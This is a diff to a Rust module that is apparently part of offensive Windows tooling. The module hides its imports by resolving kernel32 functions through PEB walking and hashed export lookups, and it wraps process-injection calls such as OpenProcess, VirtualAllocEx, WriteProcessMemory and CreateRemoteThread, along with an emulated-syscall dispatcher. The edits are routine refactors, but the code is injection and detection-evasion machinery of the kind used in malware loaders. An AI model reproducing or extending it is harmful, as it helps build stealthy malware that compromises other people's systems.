@@ -60,10 +60,10 @@ use std::sync::OnceLock;
 use log::{debug, warn};
 // Type-only imports — no function imports to avoid IAT entries.
 // All win32 API calls are resolved dynamically via pe_resolve.
-use winapi::um::winnt::HANDLE;
-use winapi::um::psapi::MEMORY_BASIC_INFORMATION;
-use winapi::shared::minwindef::{DWORD, SIZE_T, BOOL, LPVOID};
+use winapi::shared::basetsd::SIZE_T;
+use winapi::shared::minwindef::{BOOL, DWORD, LPVOID};
 use winapi::shared::ntdef::ULONG;
+use winapi::um::winnt::{HANDLE, MEMORY_BASIC_INFORMATION};
 
 // ── NTSTATUS helpers ─────────────────────────────────────────────────────────
 
@@ -156,9 +156,9 @@ fn resolve_cached(lock: &'static OnceLock<usize>, name: &[u8]) -> Option<usize> 
     }
 
     // Slow-path: resolve via PEB walking + export table hash.
-    let base = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_KERNEL32_DLL)?;
+    let base = unsafe { pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_KERNEL32_DLL) }?;
     let hash = pe_resolve::hash_str(name);
-    let addr = pe_resolve::get_proc_address_by_hash(base, hash)?;
+    let addr = unsafe { pe_resolve::get_proc_address_by_hash(base, hash) }?;
 
     // Validate that the resolved address falls within kernel32's address range.
     // This guards against PEB tampering, IAT hooks, or stale ordinal tables.
@@ -187,7 +187,7 @@ unsafe fn dynamic_get_last_error() -> DWORD {
     type FnGetLastError = unsafe extern "system" fn() -> DWORD;
     match resolve_cached(&ADDR_GET_LAST_ERROR, b"GetLastError\0") {
         Some(addr) => {
-            let f: FnGetLastError = std::mem::transmute(addr as *mut _);
+            let f: FnGetLastError = std::mem::transmute::<usize, FnGetLastError>(addr);
             f()
         }
         None => 0,
@@ -207,7 +207,7 @@ unsafe fn dynamic_write_process_memory(
     ) -> BOOL;
     match resolve_cached(&ADDR_WRITE_PROCESS_MEMORY, b"WriteProcessMemory\0") {
         Some(addr) => {
-            let f: FnWriteProcessMemory = std::mem::transmute(addr as *mut _);
+            let f: FnWriteProcessMemory = std::mem::transmute::<usize, FnWriteProcessMemory>(addr);
             f(h_process, lp_base_address, lp_buffer, n_size, lp_number_of_bytes_written)
         }
         None => 0,
@@ -227,7 +227,7 @@ unsafe fn dynamic_read_process_memory(
     ) -> BOOL;
     match resolve_cached(&ADDR_READ_PROCESS_MEMORY, b"ReadProcessMemory\0") {
         Some(addr) => {
-            let f: FnReadProcessMemory = std::mem::transmute(addr as *mut _);
+            let f: FnReadProcessMemory = std::mem::transmute::<usize, FnReadProcessMemory>(addr);
             f(h_process, lp_base_address, lp_buffer, n_size, lp_number_of_bytes_read)
         }
         None => 0,
@@ -247,7 +247,7 @@ unsafe fn dynamic_virtual_alloc_ex(
     ) -> LPVOID;
     match resolve_cached(&ADDR_VIRTUAL_ALLOC_EX, b"VirtualAllocEx\0") {
         Some(addr) => {
-            let f: FnVirtualAllocEx = std::mem::transmute(addr as *mut _);
+            let f: FnVirtualAllocEx = std::mem::transmute::<usize, FnVirtualAllocEx>(addr);
             f(h_process, lp_address, dw_size, fl_allocation_type, fl_protect)
         }
         None => std::ptr::null_mut(),
@@ -266,7 +266,7 @@ unsafe fn dynamic_virtual_free_ex(
     ) -> BOOL;
     match resolve_cached(&ADDR_VIRTUAL_FREE_EX, b"VirtualFreeEx\0") {
         Some(addr) => {
-            let f: FnVirtualFreeEx = std::mem::transmute(addr as *mut _);
+            let f: FnVirtualFreeEx = std::mem::transmute::<usize, FnVirtualFreeEx>(addr);
             f(h_process, lp_address, dw_size, dw_free_type)
         }
         None => 0,
@@ -286,7 +286,7 @@ unsafe fn dynamic_virtual_protect_ex(
     ) -> BOOL;
     match resolve_cached(&ADDR_VIRTUAL_PROTECT_EX, b"VirtualProtectEx\0") {
         Some(addr) => {
-            let f: FnVirtualProtectEx = std::mem::transmute(addr as *mut _);
+            let f: FnVirtualProtectEx = std::mem::transmute::<usize, FnVirtualProtectEx>(addr);
             f(h_process, lp_address, dw_size, fl_new_protect, lpfl_old_protect)
         }
         None => 0,
@@ -310,7 +310,7 @@ unsafe fn dynamic_create_remote_thread(
     ) -> HANDLE;
     match resolve_cached(&ADDR_CREATE_REMOTE_THREAD, b"CreateRemoteThread\0") {
         Some(addr) => {
-            let f: FnCreateRemoteThread = std::mem::transmute(addr as *mut _);
+            let f: FnCreateRemoteThread = std::mem::transmute::<usize, FnCreateRemoteThread>(addr);
             f(h_process, lp_thread_attributes, dw_stack_size, lp_start_address, lp_parameter, dw_creation_flags, lp_thread_id)
         }
         None => std::ptr::null_mut(),
@@ -326,7 +326,7 @@ unsafe fn dynamic_open_process(
     type FnOpenProcess = unsafe extern "system" fn(DWORD, BOOL, DWORD) -> HANDLE;
     match resolve_cached(&ADDR_OPEN_PROCESS, b"OpenProcess\0") {
         Some(addr) => {
-            let f: FnOpenProcess = std::mem::transmute(addr as *mut _);
+            let f: FnOpenProcess = std::mem::transmute::<usize, FnOpenProcess>(addr);
             f(dw_desired_access, b_inherit_handle, dw_process_id)
         }
         None => std::ptr::null_mut(),
@@ -338,7 +338,7 @@ unsafe fn dynamic_close_handle(h_object: HANDLE) -> BOOL {
     type FnCloseHandle = unsafe extern "system" fn(HANDLE) -> BOOL;
     match resolve_cached(&ADDR_CLOSE_HANDLE, b"CloseHandle\0") {
         Some(addr) => {
-            let f: FnCloseHandle = std::mem::transmute(addr as *mut _);
+            let f: FnCloseHandle = std::mem::transmute::<usize, FnCloseHandle>(addr);
             f(h_object)
         }
         None => 0,
@@ -357,7 +357,7 @@ unsafe fn dynamic_virtual_query_ex(
     ) -> SIZE_T;
     match resolve_cached(&ADDR_VIRTUAL_QUERY_EX, b"VirtualQueryEx\0") {
         Some(addr) => {
-            let f: FnVirtualQueryEx = std::mem::transmute(addr as *mut _);
+            let f: FnVirtualQueryEx = std::mem::transmute::<usize, FnVirtualQueryEx>(addr);
             f(h_process, lp_address, lp_buffer, dw_length)
         }
         None => 0,
@@ -1183,11 +1183,11 @@ pub fn dispatch(name: &str, args: &[u64]) -> anyhow::Result<i32> {
             emulate_nt_open_process(args[0], args[1], args[2], args[3])
         }
         "NtWriteVirtualMemory" => {
-            if args.len() < 6 {
-                return Err(anyhow::anyhow!("NtWriteVirtualMemory requires 6 arguments"));
+            if args.len() < 5 {
+                return Err(anyhow::anyhow!("NtWriteVirtualMemory requires 5 arguments"));
             }
             emulate_nt_write_virtual_memory(
-                args[0], args[1], args[2], args[3], args[4], args[5],
+                args[0], args[1], args[2], args[3], args[4],
             )
         }
         "NtReadVirtualMemory" => {
@@ -1253,10 +1253,10 @@ pub fn dispatch(name: &str, args: &[u64]) -> anyhow::Result<i32> {
 ///
 /// ```ignore
 /// // Instead of:
-/// let status = syscall!("NtClose", handle as u64);
+/// let status = crate::syscall!("NtClose", handle as u64);
 ///
 /// // Use:
-/// let status = emulated_syscall!("NtClose", handle as u64);
+/// let status = crate::emulated_syscall!("NtClose", handle as u64);
 /// ```
 ///
 /// The return type is `anyhow::Result<i32>` (NTSTATUS), identical to
